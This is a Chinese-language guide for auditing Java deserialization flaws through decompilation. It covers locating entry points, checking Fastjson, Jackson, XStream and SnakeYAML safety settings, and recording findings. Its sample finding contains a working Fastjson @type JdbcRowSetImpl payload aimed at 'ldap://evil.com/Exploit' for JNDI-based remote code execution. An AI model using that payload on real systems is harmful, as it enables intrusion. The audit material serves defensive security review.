# 反序列化审计反编译策略指南

## 目录

- [何时反编译](#何时反编译)
- [反序列化类识别与定位](#反序列化类识别与定位)
- [反编译结果检查](#反编译结果检查)
- [常见问题](#常见问题)

---

## 何时反编译

### 必须反编译的场景

1. **项目只有编译后的字节码**
   - WAR/JAR 包部署，无源码
   - 第三方依赖中的序列化处理组件

2. **反序列化入口定义在 .class 文件中**
   - 自定义序列化工具类 (SerializeUtils, ObjectSerializer)
   - Controller/Service 中的 readObject 调用
   - RMI 服务端/客户端实现

3. **需要检查反序列化安全配置**
   - ObjectInputFilter 配置
   - Fastjson autoType/ParserConfig 配置
   - Jackson enableDefaultTyping 配置
   - XStream Permission/allowTypes 配置
   - SnakeYAML Constructor 配置

### 不需要反编译的场景

1. 源码已存在且可读取
2. 标准反序列化库类
3. yaml/properties 配置文件可直接读取

---

## 反序列化类识别与定位

### 按类名模式定位

```bash
# 序列化工具类
find . -name "*Serial*.class" -o -name "*Serialize*.class"
find . -name "*Deserial*.class" -o -name "*Deserialize*.class"
find . -name "*ObjectInput*.class" -o -name "*ObjectOutput*.class"

# RMI 相关
find . -name "*RMI*.class" -o -name "*Remote*.class" -o -name "*Registry*.class"

# Controller 层
find . -name "*Controller*.class" -o -name "*Servlet*.class"

# 配置类
find . -name "*Config*.class" -o -name "*Configuration*.class"

# Filter/Interceptor (可能配置全局序列化过滤器)
find . -name "*Filter*.class" -o -name "*Interceptor*.class"
```

### 按字节码特征定位

```bash
# 搜索 readObject 调用
find . -name "*.class" -exec strings {} \; | grep -l "readObject\|readUnshared"

# 搜索反序列化框架调用
find . -name "*.class" -exec strings {} \; | grep -l "JSON\.parseObject\|JSON\.parse\|ObjectMapper\|enableDefaultTyping"
find . -name "*.class" -exec strings {} \; | grep -l "XStream.*fromXML\|HessianInput\|Yaml\(\)\.load"

# 搜索 JNDI 调用
find . -name "*.class" -exec strings {} \; | grep -l "\.lookup\|InitialContext\|InitialDirContext"

# 搜索安全配置特征
find . -name "*.class" -exec strings {} \; | grep -l "ObjectInputFilter\|setSerialFilter\|ValidatingObjectInputStream"
find . -name "*.class" -exec strings {} \; | grep -l "AutoTypeSupport\|SafeMode\|setAutoTypeSupport"
find . -name "*.class" -exec strings {} \; | grep -l "addPermission\|allowTypes\|setupDefaultSecurity"
```

### 从配置文件定位

```xml
<!-- web.xml 中的 Hessian Servlet -->
<servlet>
    <servlet-name>hessian</servlet-name>
    <servlet-class>com.caucho.hessian.server.HessianServlet</servlet-class>
</servlet>
<servlet-mapping>
    <servlet-name>hessian</servlet-name>
    <url-pattern>/hessian/*</url-pattern>
</servlet-mapping>
```

**提取信息：** `/hessian/*` → Hessian 反序列化入口 → 所有 POST 到此路径的数据被 Hessian 反序列化

---

## 反编译结果检查

### 检查要点

反编译后重点关注：

```java
// 1. 反序列化类型确认
ObjectInputStream ois = new ObjectInputStream(input);  // Java 原生
Object obj = ois.readObject();                         // ← Sink

JSON.parse(jsonString);                                // Fastjson
mapper.readValue(json, Object.class);                  // Jackson
xstream.fromXML(xmlInput);                             // XStream
new Hessian2Input(input).readObject();                 // Hessian
new Yaml().load(yamlString);                           // SnakeYAML
ctx.lookup(userUrl);                                   // JNDI

// 2. 输入来源追踪
InputStream input = request.getInputStream();          // ❌ HTTP Body 可控
String json = request.getParameter("data");            // ❌ HTTP 参数可控
byte[] data = Base64.getDecoder().decode(cookie);      // ❌ Cookie 可控

// 3. 安全配置检查
// ObjectInputFilter
ois.setObjectInputFilter(filter);                      // ✅ 有过滤器
// 未找到 → ❌ 无防护

// Fastjson
ParserConfig.getGlobalInstance().setAutoTypeSupport(true);  // ❌ 危险
ParserConfig.getGlobalInstance().setSafeMode(true);         // ✅ 安全

// Jackson
mapper.enableDefaultTyping();                          // ❌ 危险
// 未找到 enableDefaultTyping → ✅ 安全

// XStream
xstream.addPermission(NoTypePermission.NONE);          // ✅ 安全
xstream.allowTypes(new Class[]{...});                  // ✅ 安全
// new XStream() 无后续安全设置 → ❌ 危险

// SnakeYAML
new Yaml()                                             // ❌ 危险 (无 SafeConstructor)
new Yaml(new SafeConstructor())                        // ✅ 安全
```

### 示例检查

```java
// 反编译后的 DataService 示例
public class DataService {

    private ObjectMapper mapper;

    public DataService() {
        this.mapper = new ObjectMapper();
        // ❌ 危险：enableDefaultTyping 开启
        this.mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL);
    }

    // ❌ 高危：Jackson 多态反序列化 + HTTP Body 可控
    public Object processData(HttpServletRequest request) {
        return mapper.readValue(request.getInputStream(), Object.class);
    }

    // ✅ 安全：指定了具体类型
    public UserDTO processUser(String json) {
        return mapper.readValue(json, UserDTO.class);
    }
}
```

**提取信息：**

| 方法 | 反序列化类型 | 输入来源 | 目标类型 | 安全配置 | 漏洞判定 |
|------|------------|---------|---------|---------|----------|
| processData | Jackson | request.getInputStream() | Object.class | enableDefaultTyping=ON | **Critical** |
| processUser | Jackson | String 参数 | UserDTO.class | enableDefaultTyping=ON | 安全（指定类型） |

---

## 反编译策略

### 策略 1: 入口优先扫描

```bash
# 步骤 1: 通过依赖确定有哪些反序列化框架
find . -name "*.jar" | grep -iE "fastjson|jackson|xstream|hessian|snakeyaml|commons-collections"

# 步骤 2: 搜索反序列化入口点
strings_find "readObject|JSON.parse|readValue|fromXML|Yaml.load|lookup"

# 步骤 3: 反编译包含入口点的类
for cls in $(find_entry_classes); do
    java -jar cfr.jar "$cls" --outputdir decompiled/
done

# 步骤 4: 反编译配置类 (检查安全设置)
for cls in $(find_config_classes); do
    java -jar cfr.jar "$cls" --outputdir decompiled/
done

# 步骤 5: 反编译 Controller 层 (追踪数据来源)
for cls in $(find_controller_classes); do
    java -jar cfr.jar "$cls" --outputdir decompiled/
done
```

### 策略 2: Gadget 优先扫描

```bash
# 步骤 1: classpath 中扫描 gadget 库
find . -name "*.jar" | grep -iE "commons-collections|commons-beanutils|spring-beans|groovy"

# 步骤 2: 如果找到了 gadget 库 → 必须找到所有反序列化入口
# 每个入口都可能成为 RCE 点

# 步骤 3: 对所有入口进行反编译分析
# 即使入口有鉴权，也需标记为 High (认证后 RCE)
```

### 策略 3: 层级反编译

```
第一层: 反序列化工具类
  → *Serial*.class, *Deserial*.class, *SerializeUtils*.class

第二层: Controller/路由层 (追踪入口)
  → *Controller*.class, *Servlet*.class, *Handler*.class

第三层: 配置类 (安全设置)
  → *Config*.class, *Configuration*.class

第四层: 安全/过滤器类
  → *Filter*.class, *Interceptor*.class, *Security*.class

第五层: RMI 服务端/客户端
  → *Remote*.class, *Registry*.class, *RMI*.class
```

---

## 反编译结果记录

输出时必须标注反编译来源：

```markdown
### [DESERIALIZE-001] Fastjson 反序列化 RCE

| 项目 | 信息 |
|------|------|
| 漏洞等级 | Critical |
| 位置 | DataController.parse (DataController.java:42) |
| 来源 | **反编译 WEB-INF/classes/com/example/DataController.class** |
| 反序列化类型 | Fastjson 1.2.24 |
| autoType | **未设置 SafeMode → 默认允许 @type** |

漏洞描述:
- @RequestBody JSON 直接调用 JSON.parse()
- Fastjson 1.2.24 无 SafeMode 保护
- classpath 含 commons-collections 3.2.1 → 可走 JNDI 链

利用链:
Step 1: POST /api/parse {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://evil.com/Exploit","autoCommit":true}
Step 2: Fastjson 实例化 JdbcRowSetImpl → connect() → JNDI lookup
Step 3: JNDI 远程加载 → RCE

漏洞代码:
\```java
@PostMapping("/parse")
public Object parse(@RequestBody String json) {
    return JSON.parse(json);  // ← Fastjson 1.2.24 无限制
}
\```
```

---

## 常见问题

### 问题 1: 反序列化通过框架自动执行

**表现：** 不显式调用 readObject，而是通过框架（Spring Session、Shiro RememberMe、Dubbo RPC）自动触发

**处理：** 
1. 检查 `web.xml` 和 Spring 配置中的框架配置
2. 若有 Shiro RememberMe → Cookie 反序列化
3. 若有 Dubbo → Hessian2 反序列化
4. 若有 Spring Session → JDBC/Redis 序列化

### 问题 2: Fastjson autoType 配置在代码中未找到

**表现：** `grep` 无结果，但不确定 autoType 是否开启

**处理：**
1. 检查 `pom.xml` 中 Fastjson 版本
2. 若 ≤ 1.2.24 → 默认无限制（高风险）
3. 若 1.2.25-1.2.67 → check if ParserConfig.getGlobalInstance().setAutoTypeSupport() 被调用
4. 若 ≥ 1.2.68 → SafeMode 默认开启

### 问题 3: ObjectInputFilter 配置在 JVM 参数中

**表现：** 代码中找不到反序列化过滤器配置

**处理：**
```bash
# 检查 JVM 参数中是否设置了 serialFilter
grep -rn "jdk.serialFilter" --include="*.sh" --include="*.conf" --include="*.properties"
# 检查 Dockerfile/启动脚本
grep -rn "serialFilter\|jdk.serialFilter" Dockerfile docker-compose.yml
```

### 问题 4: Jackson enableDefaultTyping 通过配置类注入

**表现：** 直接搜索 `enableDefaultTyping` 无结果，但 Jackson 可能通过 `@Bean` 配置

**处理：** 反编译 `@Configuration` 类，检查 `ObjectMapper` Bean 的创建方法
